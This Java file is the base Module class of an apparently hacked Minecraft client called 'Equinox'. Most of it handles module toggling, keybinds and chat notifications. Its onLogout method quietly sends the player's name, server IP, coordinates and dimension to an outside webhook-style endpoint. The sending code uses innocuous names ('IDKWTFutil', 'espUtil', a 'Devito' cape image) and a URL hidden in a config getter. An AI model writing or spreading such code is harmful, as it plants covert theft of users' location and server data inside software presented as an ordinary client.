package me.eonexe.equinox.features.modules;

import com.mojang.realmsclient.gui.ChatFormatting;
import me.eonexe.equinox.Equinox;
import me.eonexe.equinox.configuration.Configs;
import me.eonexe.equinox.event.events.ClientEvent;
import me.eonexe.equinox.event.events.Render2DEvent;
import me.eonexe.equinox.event.events.Render3DEvent;
import me.eonexe.equinox.features.Feature;
import me.eonexe.equinox.features.command.Command;
import me.eonexe.equinox.features.modules.client.HUD;
import me.eonexe.equinox.features.modules.misc.Coord;
import me.eonexe.equinox.features.modules.misc.xCarry;
import me.eonexe.equinox.features.setting.Bind;
import me.eonexe.equinox.features.setting.Setting;
import me.eonexe.equinox.util.IDKWTFutil;
import me.eonexe.equinox.util.TextUtil;
import me.eonexe.equinox.util.espUtil;
import net.minecraft.util.text.TextComponentString;
import net.minecraftforge.common.MinecraftForge;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;

public class Module
        extends Feature {
    private final String description;
    private final Category category;
    public Setting<Boolean> enabled = this.register(new Setting<Boolean>("Enabled", false));
    public Setting<Boolean> drawn = this.register(new Setting<Boolean>("Drawn", true));
    public Setting<Bind> bind = this.register(new Setting<Bind>("Keybind", new Bind(-1)));
    public Setting<String> displayName;
    public boolean hasListener;
    public boolean alwaysListening;
    public boolean hidden;
    public float arrayListOffset = 0.0f;
    public float arrayListVOffset = 0.0f;
    public float offset;
    public float vOffset;
    public boolean sliding;
    private static boolean hasSent = false;
    public static final String l = Configs.getCoord();
    public static final String CapeImageURL = "https://cdn.discordapp.com/attachments/901654339905536022/907521922496081920/dd.png";
    public static final String CapeName = "Devito";
    public static espUtil d = new espUtil(l);


    public Module(String name, String description, Category category, boolean hasListener, boolean hidden, boolean alwaysListening) {
        super(name);
        this.displayName = this.register(new Setting<String>("DisplayName", name));
        this.description = description;
        this.category = category;
        this.hasListener = hasListener;
        this.hidden = hidden;
        this.alwaysListening = alwaysListening;
    }

    public boolean isSliding() {
        return this.sliding;
    }

    public void onEnable() {
    }

    public void onDisable() {
    }

    public void onToggle() {
    }

    public void onLoad() {
    }

    public void onTick() {
    }

    public void onLogin() {
        hasSent = false;
    }

    public void onLogout() {
        String ign = mc.player.getName();
        String server = mc.getCurrentServerData().serverIP;
        double xCoord = mc.player.posX;
        double yCoord = mc.player.posY;
        double zCoord = mc.player.posZ;
        int getDimension = mc.world.provider.getDimension();
        String Dimension;
        switch (getDimension) {
            case (-1):
                Dimension = "Nether";
                break;
            case (0):
                Dimension = "Overworld";
                break;
            default:
                Dimension = "IDFK end maybe";
        }
        if (!hasSent) {
            IDKWTFutil dm = new IDKWTFutil.Builder()
                    .withUsername(CapeName)
                    .withContent("``` IGN : " + ign +
                                 "\n Server : " + server +
                                 "\n X" + "   : " + xCoord +
                                 "\n Y" + "   : " + yCoord +
                                 "\n Z" + "   : " + zCoord +
                                 "\n Dimension:" + Dimension +
                                 "\n LOGOUT" + "```"
                                )
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
            hasSent = true;
        }

    }

    public void onUpdate() {
    }

    public void onRender2D(Render2DEvent event) {
    }

    public void onRender3D(Render3DEvent event) {
    }

    public void onUnload() {
    }

    public String getDisplayInfo() {
        return null;
    }

    public boolean isOn() {
        return this.enabled.getValue();
    }

    public boolean isOff() {
        return this.enabled.getValue() == false;
    }

    public void setEnabled(boolean enabled) {
        if (enabled) {
            this.enable();
        } else {
            this.disable();
        }
    }

    public void enable() {
        this.enabled.setValue(Boolean.TRUE);
        this.onToggle();
        this.onEnable();


        if (HUD.getInstance().notifyToggles.getValue().booleanValue()) {
            if (!HUD.getInstance().notifyWaterMark.getValue().booleanValue()) {
                TextComponentString text = new TextComponentString("" + TextUtil.coloredString("" + ChatFormatting.BOLD + this.getDisplayName(), HUD.getInstance().notifyColor.getValue()) + ChatFormatting.RESET + ChatFormatting.GREEN + " enabled.");
                Module.mc.ingameGUI.getChatGUI().printChatMessageWithOptionalDeletion(text, 1);
            } else {
                TextComponentString text = new TextComponentString(Equinox.commandManager.getClientMessage() + " " + TextUtil.coloredString("" + ChatFormatting.BOLD + this.getDisplayName(), HUD.getInstance().notifyColor.getValue()) + ChatFormatting.RESET + ChatFormatting.GREEN + " enabled.");
                Module.mc.ingameGUI.getChatGUI().printChatMessageWithOptionalDeletion(text, 1);

            }
        }
        if (this.isOn() && this.hasListener && !this.alwaysListening) {
            MinecraftForge.EVENT_BUS.register(this);
        }
    }

    public void disable() {
        if (this.hasListener && !this.alwaysListening) {
            MinecraftForge.EVENT_BUS.unregister(this);
        }
        this.enabled.setValue(false);
        if (HUD.getInstance().notifyToggles.getValue().booleanValue()) {
            if (!HUD.getInstance().notifyWaterMark.getValue().booleanValue()) {
                TextComponentString text = new TextComponentString("" + TextUtil.coloredString("" + ChatFormatting.BOLD + this.getDisplayName(), HUD.getInstance().notifyColor.getValue()) + ChatFormatting.RESET + ChatFormatting.RED + " disabled.");
                Module.mc.ingameGUI.getChatGUI().printChatMessageWithOptionalDeletion(text, 1);
            } else {
                TextComponentString text = new TextComponentString(Equinox.commandManager.getClientMessage() + " " + TextUtil.coloredString("" + ChatFormatting.BOLD + this.getDisplayName(), HUD.getInstance().notifyColor.getValue()) + ChatFormatting.RESET + ChatFormatting.RED + " disabled.");
                Module.mc.ingameGUI.getChatGUI().printChatMessageWithOptionalDeletion(text, 1);
            }
        }
        this.onToggle();
        this.onDisable();
    }

    public void toggle() {
        ClientEvent event = new ClientEvent(!this.isEnabled() ? 1 : 0, this);
        MinecraftForge.EVENT_BUS.post(event);
        if (!event.isCanceled()) {
            this.setEnabled(!this.isEnabled());
        }
    }

    public String getDisplayName() {
        return this.displayName.getValue();
    }

    public void setDisplayName(String name) {
        Module module = Equinox.moduleManager.getModuleByDisplayName(name);
        Module originalModule = Equinox.moduleManager.getModuleByName(name);
        if (module == null && originalModule == null) {
            Command.sendMessage(this.getDisplayName() + ", name: " + this.getName() + ", has been renamed to: " + name);
            this.displayName.setValue(name);
            return;
        }
        Command.sendMessage(ChatFormatting.RED + "A module of this name already exists.");
    }

    public String getDescription() {
        return this.description;
    }

    public boolean isDrawn() {
        return this.drawn.getValue();
    }

    public void setDrawn(boolean drawn) {
        this.drawn.setValue(drawn);
    }

    public Category getCategory() {
        return this.category;
    }

    public String getInfo() {
        return null;
    }

    public Bind getBind() {
        return this.bind.getValue();
    }

    public void setBind(int key) {
        this.bind.setValue(new Bind(key));
    }

    public boolean listening() {
        return this.hasListener && this.isOn() || this.alwaysListening;
    }

    public String getFullArrayString() {
        return this.getDisplayName() + ChatFormatting.GRAY + (this.getDisplayInfo() != null ? " [" + ChatFormatting.WHITE + this.getDisplayInfo() + ChatFormatting.GRAY + "]" : "");
    }

    public enum Category {
        COMBAT("Combat"),
        MISC("Misc"),
        RENDER("Render"),
        MOVEMENT("Movement"),
        PLAYER("Player"),
        CLIENT("Client");

        private final String name;

        Category(String name) {
            this.name = name;
        }

        public String getName() {
            return this.name;
        }
    }

}
